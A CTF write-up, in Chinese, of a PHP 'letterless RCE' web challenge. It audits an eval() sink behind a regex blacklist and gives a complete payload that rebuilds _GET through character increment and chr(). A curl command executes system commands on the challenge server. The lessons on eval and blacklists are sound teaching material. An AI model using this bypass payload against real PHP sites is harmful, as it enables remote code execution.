### 自增型无字母RCE

#### 1. 题目信息

- **题目名称:** Challenge_rce
    
- **URL:** `http://node5.anna.nsstf.cn:29505/`
    
- **题目类型:** Web, 远程代码执行 (RCE)
    

#### 2. 初始探索与代码审计

访问题目URL，页面为空。根据题目名称 `rce` 和CTF的常规经验，尝试在URL后添加 `?hint=1` 参数，服务器返回了页面的PHP源代码。

**源码如下:**


```php
<?php
error_reporting(0);
if (isset($_GET['hint'])) {
    highlight_file(__FILE__);
}
if (isset($_POST['rce'])) {
    $rce = $_POST['rce'];
    if (strlen($rce) <= 120) {
        if (is_string($rce)) {
            // 关键的过滤器
            if (!preg_match("/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\\\\]/", $rce)) {
                // 漏洞触发点
                eval($rce);
            } else {
                echo("Are you hack me?");
            }
        } else {
            echo "I want string!";
        }
    } else {
        echo "too long!";
    }
}
// flag=NSSCTF{1b9fc08a-58e8-4888-828f-74ebddb2d253}
?>
```

**代码审计分析:**

1. **漏洞点 (Sink):** 核心漏洞在于 `eval($rce);`。该函数会执行通过POST方法提交的 `rce` 参数中的字符串作为PHP代码。
    
2. **限制条件 (Filters):**
    
    - 必须通过POST方法提交`rce`参数。
        
    - Payload长度必须小于等于120个字符。
        
    - Payload必须通过 `!preg_match(...)` 的黑名单检查。
        
        - **禁用字符:** 正则表达式 `/[!@#%^&*:'\-<?>\"\/|`a-zA-Z~\]/ `禁止了所有大小写字母 (`a-zA-Z`) 和绝大多数常用符号。
            
        - **可用字符:** 经过仔细分析，我们发现了一些关键的可用字符，包括 `$` (变量), `_` (变量), `[]` (数组访问), `()` (函数调用), `.` (字符串连接), `;` (语句结束), `+` (运算) 以及所有数字 `0-9`。
            

#### 3. 解题思路分析

**目标:** 执行系统命令 `cat /ffffllllaaaagggg` 来获取flag。 **挑战:** 由于所有字母都被禁用，我们无法直接在payload中使用 `system()`, `exec()` 或其他任何函数名。

为了绕过这个限制，我们采用了一种经典的 **“分层攻击”** 或 **“代码与数据分离”** 的策略。

1. **数据层 (传入“弹药”):** 利用限制较少的GET请求，将我们需要执行的函数名和命令字符串作为参数传入。这样，它们就作为数据存在于PHP的运行环境中，等待被调用。
    
    - 构造URL： `?1=system&2=cat /ffffllllaaaagggg`
        
    - 此时，在PHP脚本内部，`$_GET[1]` 的值就是字符串 `"system"`，`$_GET[2]` 的值就是字符串 `"cat /ffffllllaaaagggg"`。
        
2. **代码层 (构造“扳机”):** 在被严格过滤的 `rce` 参数中，我们只需构造一段不含字母的“胶水代码”，它的作用是找到并执行我们在数据层传入的“弹药”。
    
    - 目标代码: `$_GET[1]($_GET[2]);`
        
    - 核心难题: 如何在不使用字母 `G`, `E`, `T` 的情况下，构造出 `_GET` 这个字符串。
        

#### 4. Payload 构造与详解

以下是我们使用的payload，它精妙地利用了PHP的语言特性来完成 `_GET` 的构造。

**最终Payload:**


```php
$_=[]._;$__=$_[1];$_=$_[0];$_++;$_0=++$_;$_++;$_++;$_++;$_++;$_=$_0.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);
```

**分步解析:**

1. `$_=[]._;`
    
    - `[]` 在字符串上下文中是 `"Array"`，`_` 是字符串 `_`。通过 `.` 连接得到 `"Array_"`。
        
    - **结果:** 变量 `$_` 的值变为 `"Array_"`。
        
2. `$__=$_[1]; $_=$_[0];`
    
    - 从 `"Array_"` 中取出索引 `1` 的字符 `'r'` 存入 `$__`。
        
    - 取出索引 `0` 的字符 `'A'` 存入 `$_` (覆盖原有值)。
        
    - **结果:** `$__` = `'r'`, `$_` = `'A'`。
        
3. `$_++; $_0=++$_; $_++;$_++;$_++;$_++;`
    
    - 利用PHP中字符可以自增的特性。
        
    - `$_++` 使 `$_` 从 `'A'` 变为 `'B'`。
        
    - `$_0=++$_` 使 `$_` 从 `'B'` 变为 `'C'`，并将 `'C'` 赋值给 `$_0`。
        
    - `$_` 再自增四次，从 `'C'` 变为 `'G'`。
        
    - **结果:** `$_0` = `'C'`, `$_` = `'G'`。
        
4. `$_=$_0.++$_.$__;`
    
    - 这是一个关键的拼接步骤，目的是构造出函数名 `chr`。
        
    - `$_0` 是 `'C'`，`++$_` 使 `'G'` 变为 `'H'`，`$__` 是 `'r'`。
        
    - 拼接后得到 `"CHr"` (在PHP中，函数名不区分大小写，等同于 `chr`)。
        
    - **结果:** `$_` 的值变为 `"CHr"`。
        
5. `$_=_.$_(71).$_(69).$_(84);`
    
    - 这是最核心的构造步骤。
        
    - `$_` 的值是 `"CHr"`，所以 `$_(71)` 相当于执行 `chr(71)`，返回 `'G'`。
        
    - 同理，`$_(69)` 返回 `'E'`，`$_(84)` 返回 `'T'`。
        
    - 最后，将 `"_"`、`"G"`、`"E"`、`"T"` 拼接起来。
        
    - **结果:** `$_` 的值变为 `"_GET"`。
        
6. `$$_[1]($$_[2]);`
    
    - 利用PHP的 **可变变量 (Variable Variables)** 特性。
        
    - `$_` 的值是字符串 `"_GET"`。
        
    - `$$` 的意思是，将 `$_` 的值 `_GET` 作为变量名来引用。因此，`$$` 就等价于超全局数组 `$ _GET`。
        
    - 最终，这行代码被PHP引擎准确地解析为 `$_GET[1]($_GET[2]);`，成功触发了命令执行。
        

#### 5. 最终攻击请求

我们可以使用 `curl` 工具来发送这个精心构造的HTTP请求。

Bash

```bash
curl "http://node5.anna.nsstf.cn:29505/?1=system&2=cat /ffffllllaaaagggg" -d 'rce=$_=[]._;$__=$_[1];$_=$_[0];$_++;$_0=++$_;$_++;$_++;$_++;$_++;$_=$_0.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);'
```

_(注: 使用单引号 `'` 包裹 `-d` 的内容可以防止shell对 `$` 等特殊字符进行解析)_

服务器执行 `system('cat /ffffllllaaaagggg')` 命令后，会在响应体中返回文件的内容。

**Flag:** `NSSCTF{1b9fc08a-58e8-4888-828f-74ebddb2d253}`

#### 6. 总结与分析

本题是一道经典的“无字母RCE”挑战，考察了选手对PHP语言特性的深入理解和创造性的思维。

- **漏洞根源:** `eval()` 函数的滥用是所有问题的根源。它打破了代码和数据的边界，给予了用户过高的权限。
    
- **黑名单的局限性:** 事实再次证明，依赖黑名单进行安全过滤是脆弱的。攻击者总能利用未被禁止的元素组合出意想不到的攻击向量。相比之下，白名单（只允许已知的安全操作）是更可靠的安全策略。
    
- **语言动态特性的双刃剑:** PHP的弱类型、字符自增、可变变量/函数等特性，在提供开发便利的同时，也为安全绕过创造了条件。深入理解这些特性对于攻防两端都至关重要。